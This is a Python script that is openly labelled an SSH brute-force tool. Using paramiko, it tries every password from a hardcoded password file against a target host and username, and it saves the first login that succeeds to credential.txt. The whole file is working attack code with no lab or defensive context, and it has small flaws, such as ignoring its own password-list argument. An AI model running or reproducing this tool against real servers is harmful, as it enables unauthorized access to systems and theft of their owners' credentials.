import paramiko
import time
import socket
import argparse
from colorama import init, Fore

green=Fore.GREEN
blue=Fore.BLUE
reset=Fore.RESET
red=Fore.RED

def check_connection(hostname,username,password):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname,username=username,password=password)
    except socket.timeout:
        print(f"{red}[-] Host:{hostname} is unreacheable. Time out.{reset}")
        return False
    except paramiko.AuthenticationException:
        print(f"[-]Invalid Login Cradential for username : {username}, password : {password} ")
    except paramiko.SSHException:
        print(f"{blue} [*] Retrying with delay {reset} ")
        time.sleep(60)
        return check_connection(hostname,username,password)
    except Exception as e:
        print(f"Error :{e}")
    else:
         print(f"{green}Connection Eastablished With Host:{hostname} of User:{username}")
         return True
if __name__=='__main__':
    parser=argparse.ArgumentParser(description="SSH Brutforce.")
    parser.add_argument('host',help='Hostname or Ip adderess of server.')
    parser.add_argument('-P','--passlist',help='Password Fike for Brutforce.')
    parser.add_argument('-u','--user',help='Host username.')

    args=parser.parse_args()
    host=args.host
    passlist=args.passlist
    user=args.user
    
    passlist=open("passwords.txt").read().splitlines()
    for password in passlist:
        if check_connection(host,user,password):
            open("credential.txt",'w').write(f"{user}@{host}:{password}")
            break

